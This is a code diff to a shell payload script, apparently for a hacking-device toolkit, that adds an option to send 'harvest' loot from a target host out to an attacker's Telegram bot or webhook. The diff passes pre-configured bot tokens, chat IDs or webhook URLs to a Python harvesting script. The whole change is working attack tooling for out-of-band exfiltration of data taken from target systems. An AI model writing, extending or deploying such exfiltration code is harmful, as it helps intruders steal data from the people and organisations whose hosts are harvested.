@@ -702,16 +702,52 @@ _do_harvest() {
     mkdir -p "$loot_dir"
     local log_path="${loot_dir}/harvest_${host_ip}_$(date +%Y%m%d_%H%M%S).log"
 
+    # ── OOB exfil selection ───────────────────────────────────────────────────
+    # Operator pre-configures EXFIL_BOT_TOKEN/EXFIL_CHAT_ID or EXFIL_WEBHOOK_URL
+    # in payload.sh header. These prompts ask whether to activate them.
+    EXFIL_ARGS=""
+    local resp resp2
+    resp=$(CONFIRMATION_DIALOG "Out-of-band exfil?" "Send harvest data to attacker Telegram bot or webhook")
+    case "$resp" in
+        $DUCKYSCRIPT_USER_CONFIRMED)
+            resp2=$(CONFIRMATION_DIALOG "Exfil method?" "YES=Telegram bot  NO=Webhook URL")
+            case "$resp2" in
+                $DUCKYSCRIPT_USER_CONFIRMED)
+                    # Telegram: bot_token and chat_id pre-configured in payload header
+                    if [ -n "${EXFIL_BOT_TOKEN:-}" ] && [ -n "${EXFIL_CHAT_ID:-}" ]; then
+                        EXFIL_ARGS="--exfil-telegram ${EXFIL_BOT_TOKEN}:${EXFIL_CHAT_ID}"
+                        LOG green "OOB: Telegram configured"
+                    else
+                        LOG red "Set EXFIL_BOT_TOKEN and EXFIL_CHAT_ID in payload header"
+                        sleep 2
+                    fi
+                    ;;
+                *)
+                    # Webhook: pre-configured constant EXFIL_WEBHOOK_URL
+                    if [ -n "${EXFIL_WEBHOOK_URL:-}" ]; then
+                        EXFIL_ARGS="--exfil-webhook ${EXFIL_WEBHOOK_URL}"
+                        LOG green "OOB: Webhook configured"
+                    else
+                        LOG red "Set EXFIL_WEBHOOK_URL in payload header"
+                        sleep 2
+                    fi
+                    ;;
+            esac
+            ;;
+    esac
+
     LOG blue "Harvesting ${host_ip}:${host_port}..."
     led_scanning
 
     local SID
     SID=$(START_SPINNER "Harvesting ${host_ip}...")
 
+    # shellcheck disable=SC2086
     python3 "$harvest_py" \
         --ip "$host_ip" \
         --port "$host_port" \
-        --out "$log_path"
+        --out "$log_path" \
+        $EXFIL_ARGS
 
     local exit_code=$?
     STOP_SPINNER "$SID"
